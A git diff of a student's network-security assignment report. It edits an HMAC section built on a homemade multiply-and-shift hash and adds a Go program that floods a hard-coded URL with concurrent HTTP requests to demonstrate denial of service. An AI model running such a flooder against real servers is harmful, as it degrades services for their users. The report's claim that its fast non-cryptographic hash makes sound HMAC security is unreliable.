@@ -17,6 +17,11 @@ Implement HMAC and verify message integrity,confidentiality and non repudiation.
 
 ## Solution
 
+Language Used: **Rust**
+
+> The code is too big to be included in the report. It's available in
+> [github](https://github.com/dipeshkaphle/NetSecAssignment/tree/main/hmac).
+
 ### Approach
 
 We must verify Non Repudiation, Confidentiality and Message Integrity. **HMAC**
@@ -59,20 +64,32 @@ let priv_key = rsa::encrypt_private(&rsa::encrypt_public(AES_KEY));
 digest. The inspiration for this algorithm was taken from the book
 [The Art of Computer Programming by Donald Knuth, Volume 3,Section 6.4, page 518](https://www.amazon.in/Art-Computer-Programming-Sorting-Searching/dp/0201896850).
 The algorithm is extremely fast, because it's just a multiplication followed by
-a shift, in order to bring the output to some [0, 2^k) domain. We don't have the
-shift state as we want the domain to be full [0,2^128). The hash function is
-known to produce a very uniform distribution of hash values, hence minimizing
+a shift, in order to bring the output to some [0, 2^k^ ) domain. We don't have
+the shift state as we want the domain to be full [0, 2^128^ ). The hash function
+is known to produce a very uniform distribution of hash values, hence minimizing
 collisions.
 
 We hash each input byte with this and combine all of them parallely, which makes
 a very good usage of CPU cores. **In order to hash a 2 Mega Byte String, our CPU
 usage was well over 200% for this algorithm**. The hash combining strategy is
 also just a bunch of shifts and additions which will be very fast. The hash
-function has `Avalance Effect` as well, whcih makes it a very hash function.
+function has `Avalanche Effect` as well, whcih makes it a very hash function.
 
-| More than 200% CPU usage for 2MB string | Code for 200% CPU usage        |
-| :-------------------------------------- | :----------------------------- |
-| ![](./img/200percent.png)               | ![](./img/200percent_code.png) |
+| Code for FibMulCombineHash(Part 1) |
+| :--------------------------------- |
+| ![](./img/hash1.png)               |
+
+| Code for FibMulCombineHash(Part 2) |
+| :--------------------------------- |
+| ![](./img/hash2.png)               |
+
+| More than 200% CPU usage for 2MB string |
+| :-------------------------------------- |
+| ![](./img/200percent.png)               |
+
+| Code for 200% CPU usage        |
+| :----------------------------- |
+| ![](./img/200percent_code.png) |
 
 | Avalanche Effect         |
 | :----------------------- |
@@ -101,16 +118,18 @@ pub struct SenderStruct {
     proves **Message Integrity**.
 13. **Receiver** will then go on and decrypt the `ENC_AES_KEY` using
     `PRIV(receiver)` and `PUB(sender)`. It will be
-    ```rust
-    let aes_priv_key =
-       rsa::decrypt_private(&rsa::decrypt_public(&sender_params.rsa_enc_aes_key));
-    ```
+
+```rust
+let aes_priv_key =
+   rsa::decrypt_private(&rsa::decrypt_public(&sender_params.rsa_enc_aes_key));
+```
+
 14. This RSA decryption proves **Non Repudiation**,since private key of the
     sender was involved in the AESKEY encryption.
 15. Now the encrypted message `ENC_MSG` can be decrypted using the `AESKEY`.
     This proves **Confidentiality**
 
-#### Output
+### Output
 
 | Sender Output             |
 | :------------------------ |
@@ -124,10 +143,156 @@ pub struct SenderStruct {
 | :-------------------------- |
 | ![](./img/receiver_out.png) |
 
+# DOS
+
+## Problem Statement
+
+Demonstrate DOS(Denial of Service) Attack
+
+## Solution
+
+Language Used: **Golang**
+
+### Output
+
+| 100 Requests           |
+| :--------------------- |
+| ![](./img/100_req.png) |
+
+| 500 Requests           |
+| :--------------------- |
+| ![](./img/500_req.png) |
+
+| 2000 Requests           |
+| :---------------------- |
+| ![](./img/2000_req.png) |
+
+| 10000 Requests           |
+| :----------------------- |
+| ![](./img/10000_req.png) |
+
+All the requests were sent to [this url](https://delta.nitt.edu/~dipesh/output).
+It's serving contents of a text file.
+
+We can see from the stats, as the no of requests goes up, the average time take
+for a request and number of failed requests grows. This is basically a **Denial
+Of Service** for the user as it's increasing the latency as well as bringing
+down the availability of the service.
+
+### Code
+
+> Code is small enough, so we're including it in the report. It's available in
+> [github](https://github.com/dipeshkaphle/NetSecAssignment/tree/main/denial_of_service)
+
+```go
+
+package main
+import (
+	"fmt"
+	"net/http"
+	"os"
+	"strconv"
+	"sync"
+	"time"
+)
+func request() (bool, time.Duration) {
+	time_now := time.Now()
+
+	_, err := http.Get("https://delta.nitt.edu/~dipesh/output")
+	if err != nil {
+		fmt.Errorf("%v", err)
+		return false, time.Since(time_now)
+	}
+
+	return true, time.Since(time_now)
+}
+func main() {
+	var mt sync.Mutex
+	n := os.Getenv("N")
+	c := os.Getenv("C")
+
+	loop_cnt := 1
+	conc := 1
+
+	if len(n) != 0 {
+		tmp, e := strconv.Atoi(n)
+		if e == nil {
+			loop_cnt = tmp
+		}
+	}
+
+	if len(c) != 0 {
+		tmp, e := strconv.Atoi(c)
+		if e == nil {
+			conc = tmp
+		}
+	}
+	fmt.Printf("Concurrency Level: %v, Num of Times: %v\n", conc, loop_cnt)
+
+	sCnt := 0
+	fCnt := 0
+	successTimes := 0.0
+	failureTimes := 0.0
+
+	reportChan := make(chan int)
+	var reporterWG sync.WaitGroup
+	reporterWG.Add(1)
+
+	go func() {
+		defer reporterWG.Done()
+		prevTime := time.Now()
+		for {
+			val := <-reportChan
+			if val == 0 {
+				fmt.Printf("Reporter thread signing off!!\n")
+				break
+			}
+			if val%500 == 0 {
+				curTime := time.Now()
+				fmt.Printf("Completed %v requests in %v seconds!!\n", val, curTime.Sub(prevTime).Seconds())
+				prevTime = curTime
+			}
+		}
+	}()
+	totalCnt := 0
+	for i := 0; i < loop_cnt; i++ {
+		var wg sync.WaitGroup
+
+		for j := 0; j < conc; j++ {
+			wg.Add(1)
+			go func() {
+				defer wg.Done()
+				res, time_taken := request()
+				if res {
+					mt.Lock()
+					totalCnt += 1
+					sCnt = sCnt + 1
+					successTimes = successTimes + time_taken.Seconds()
+					reportChan <- totalCnt
+					mt.Unlock()
+				} else {
+					mt.Lock()
+					totalCnt += 1
+					fCnt = fCnt + 1
+					failureTimes = failureTimes + time_taken.Seconds()
+					reportChan <- totalCnt
+					mt.Unlock()
+				}
+			}()
+		}
+		wg.Wait()
+	}
+	reportChan <- 0
+	reporterWG.Wait()
+	fmt.Printf("Success: %d, Failure: %d\n", sCnt, fCnt)
+	fmt.Printf("Avg Success Time: %v\n", successTimes/float64(sCnt))
+	fmt.Printf("Avg Failure Time: %v\n", failureTimes/float64(fCnt))
+}
+
+```
+
+# Shrew Attack
+
 # Buffer Overflow
 
 # Illegal Packet
-
-# DOS
-
-# Shrew Attack
